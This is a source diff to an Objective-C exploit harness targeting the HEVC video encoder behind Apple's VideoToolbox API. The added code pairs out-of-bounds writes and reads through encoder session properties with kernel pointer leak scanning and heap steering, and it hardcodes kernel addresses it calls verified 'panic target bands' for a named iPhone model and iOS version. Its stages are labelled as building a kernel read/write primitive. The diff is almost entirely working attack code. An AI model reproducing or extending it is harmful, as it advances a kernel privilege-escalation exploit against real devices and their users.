@@ -1432,6 +1432,8 @@ static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
             NSArray *preCandPairs = @[
                 @[ @"HwFeatureOn",             @8 ],
                 @[ @"HwFeatureOff",            @8 ],
+                @[ @"EnableEntropyCodingSync", (id)kCFBooleanFalse ],
+                @[ @"EnableEntropyCodingSync", (id)kCFBooleanTrue ],
                 @[ @"SwFeatureOn",             @1 ],
                 @[ @"PerfFeatureOn",           @1 ],
                 @[ @"AlgFeatureOn",            @1 ],
@@ -1570,6 +1572,8 @@ static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
                         @[ @"Quality",                 @0.25 ],
                         @[ @"Quality",                 @0.75 ],
                         @[ @"Quality",                 @1.0 ],
+                        @[ @"EnableEntropyCodingSync", (id)kCFBooleanFalse ],
+                        @[ @"EnableEntropyCodingSync", (id)kCFBooleanTrue ],
                         @[ @"HwFeatureOn",             @8 ],
                         @[ @"HwFeatureOff",            @8 ],
                         @[ @"AlgFeatureOn",            @1 ],
@@ -2673,6 +2677,7 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                 }
 
                 NSDictionary *kfProps = @{ (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @YES };
+                OSStatus stEcsFalse = VTSessionSetProperty(rwS, CFSTR("EnableEntropyCodingSync"), kCFBooleanFalse);
                 OSStatus stHw8 = VTSessionSetProperty(rwS, CFSTR("HwFeatureOn"), (__bridge CFNumberRef)@8);
                 VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                 OSStatus enc1St = VTCompressionSessionEncodeFrame(rwS, pxHold, CMTimeMake(1, 30), kCMTimeInvalid,
@@ -2690,8 +2695,48 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                     }
                     CFRelease(rbHw8);
                 }
+                // HwFeatureOn=8 merges into [x19 + 0x2b8] during PrepareToEncodeFrames (0x5527668 -> 0x54fce04),
+                // so if post-prepare SetProperty("HwFeatureOn", @8) did not re-latch [x19 + 0x2b8], verify the
+                // deterministic 0x00000100 -> 0x00000000 toggle via a pre-prepare HwFeatureOn=8 session:
+                if (afterHw8Oob0 != 0) {
+                    Stage6ProbeResult *hw8Res = Stage6AllocResult();
+                    VTCompressionSessionRef hw8S = NULL;
+                    if (hw8Res && VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
+                                                             (__bridge CFDictionaryRef)rwSpec, NULL, NULL,
+                                                             Stage6OutputCallback, hw8Res, &hw8S) == noErr && hw8S) {
+                        VTSessionSetProperty(hw8S, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+                        KPH9PrimeRealTime(hw8S);
+                        VTSessionSetProperty(hw8S, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
+                        stHw8 = VTSessionSetProperty(hw8S, CFSTR("HwFeatureOn"), (__bridge CFNumberRef)@8);
+                        VTSessionSetProperty(hw8S, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpFull16);
+                        VTSessionSetProperty(hw8S, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr6);
+                        VTSessionSetProperty(hw8S, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpFull16);
+                        VTCompressionSessionPrepareToEncodeFrames(hw8S);
+                        enc1St = VTCompressionSessionEncodeFrame(hw8S, pxHold, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                        int whw = 0;
+                        while (hw8Res->cbCount < 1 && whw < 80) { usleep(2000); whw += 2; }
+                        VTSessionSetProperty(hw8S, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
+                        CFTypeRef rbHw8Pre = NULL;
+                        if (VTSessionCopyProperty(hw8S, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbHw8Pre) == noErr && rbHw8Pre) {
+                            NSArray *nsHw8Pre = (__bridge NSArray *)rbHw8Pre;
+                            if ([nsHw8Pre isKindOfClass:[NSArray class]] && nsHw8Pre.count >= 72) {
+                                afterHw8Oob0 = [nsHw8Pre[17] intValue];
+                                afterHw8Alias32 = [nsHw8Pre[32] intValue];
+                            }
+                            CFRelease(rbHw8Pre);
+                        }
+                        VTSessionSetProperty(hw8S, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
+                        @synchronized ([KPH9EncoderModule class]) { hw8Res->closed = 1; }
+                        KPH9SafeTeardownEx(hw8S, NULL, hw8Res);
+                    } else if (hw8Res) {
+                        free(hw8Res);
+                    }
+                }
+                (void)stEcsFalse;
 
+                OSStatus stEcsTrue = VTSessionSetProperty(rwS, CFSTR("EnableEntropyCodingSync"), kCFBooleanTrue);
                 OSStatus stHwOff8 = VTSessionSetProperty(rwS, CFSTR("HwFeatureOff"), (__bridge CFNumberRef)@8);
+                (void)stEcsTrue;
                 VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                 OSStatus enc2St = VTCompressionSessionEncodeFrame(rwS, pxHold, CMTimeMake(2, 30), kCMTimeInvalid,
                                                                   (__bridge CFDictionaryRef)kfProps, NULL, NULL);
@@ -2737,8 +2782,16 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
     // -------------------------------------------------------------------------
     KPH9OutAppend(log, @"  [8B: DPB x34 OOB Write + UserRPSForFaceTime (0x92f13c) Cross-Property Readback & RPS OOB Shaper]\n");
     {
-        uint64_t targetKPtr0 = (gStage5CandCount > 0) ? gStage5Cands[0].kptr : 0xffffffedfd620000ULL;
-        uint64_t targetKPtr1 = (gStage5CandCount > 1) ? gStage5Cands[1].kptr : 0xffffffe289ee5658ULL;
+        uint64_t targetKPtr0 = 0xffffffedfd620000ULL;
+        uint64_t targetKPtr1 = 0xffffffe289ee5658ULL;
+        int foundZoneCands = 0;
+        for (int ci = 0; ci < gStage5CandCount && foundZoneCands < 2; ci++) {
+            if (KPClassifyKPtr(gStage5Cands[ci].kptr) == KPTR_CANDIDATE_ZONE_HEAP) {
+                if (foundZoneCands == 0) targetKPtr0 = gStage5Cands[ci].kptr;
+                else targetKPtr1 = gStage5Cands[ci].kptr;
+                foundZoneCands++;
+            }
+        }
         uint32_t kp0Lo = (uint32_t)(targetKPtr0 & 0xffffffffULL);
         uint32_t kp0Hi = (uint32_t)(targetKPtr0 >> 32);
         uint32_t kp1Lo = (uint32_t)(targetKPtr1 & 0xffffffffULL);
@@ -2854,11 +2907,20 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
     // -------------------------------------------------------------------------
     KPH9OutAppend(log, @"  [8C: Dynamic NTL Heap-Band Steering & Shared IOSurface / Candidate VA Delta Verification]\n");
     {
-        // Collect unique steeredNTL targets from Stage 5 ZONE_HEAP candidates (plus fallback 16445 -> 0xffffffee and 15989 -> 0xfffffe26)
-        int targetNTLs[6];
-        uint64_t targetKPtrs[6];
+        // Place the 4 verified iPhone16,1 iOS 27.0.1 panic target bands FIRST so they are never crowded out,
+        // then append up to 4 unique live ZONE_HEAP candidates discovered in Stage 5.
+        int targetNTLs[8];
+        uint64_t targetKPtrs[8];
         int nTargets = 0;
-        for (int ci = 0; ci < gStage5CandCount && nTargets < 4; ci++) {
+        const int fallbackNTLs[4] = { 16444, 16446, 16433, 16462 };
+        const uint64_t fallbackKPtrs[4] = { 0xffffffedfd620000ULL, 0xffffffefff31b3f0ULL, 0xffffffe289ee5658ULL, 0xffffffff00000059ULL };
+        for (int fi = 0; fi < 4 && nTargets < 8; fi++) {
+            targetNTLs[nTargets] = fallbackNTLs[fi];
+            targetKPtrs[nTargets] = fallbackKPtrs[fi];
+            nTargets++;
+        }
+        for (int ci = 0; ci < gStage5CandCount && nTargets < 8; ci++) {
+            if (KPClassifyKPtr(gStage5Cands[ci].kptr) != KPTR_CANDIDATE_ZONE_HEAP) continue;
             int sntl = gStage5Cands[ci].steeredNTL;
             if (sntl > 0 && sntl < 16463) {
                 BOOL dup = NO;
@@ -2870,19 +2932,6 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                     targetKPtrs[nTargets] = gStage5Cands[ci].kptr;
                     nTargets++;
                 }
-            }
-        }
-        const int fallbackNTLs[4] = { 16462, 16444, 16446, 16433 };
-        const uint64_t fallbackKPtrs[4] = { 0xffffffff00000059ULL, 0xffffffedfd620000ULL, 0xffffffefff31b3f0ULL, 0xffffffe289ee5658ULL };
-        for (int fi = 0; fi < 4 && nTargets < 6; fi++) {
-            BOOL dup = NO;
-            for (int j = 0; j < nTargets; j++) {
-                if (targetNTLs[j] == fallbackNTLs[fi]) { dup = YES; break; }
-            }
-            if (!dup) {
-                targetNTLs[nTargets] = fallbackNTLs[fi];
-                targetKPtrs[nTargets] = fallbackKPtrs[fi];
-                nTargets++;
             }
         }
 
@@ -3714,7 +3763,7 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
                 size_t words = outSz / sizeof(uint64_t);
                 for (size_t w = 0; w < words && candidates < 64; w++) {
                     uint64_t v = pageBuf[w];
-                    if (w + 1 < words && pageBuf[w + 1] == 0x000000000000beefULL) continue;
+                    if (KPIsContextFalsePositive(pageBuf, words, w)) continue;
                     if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                         if (sampleCount < 16) {
                             Stage5KPtrRecord *rec = &localCands[sampleCount++];
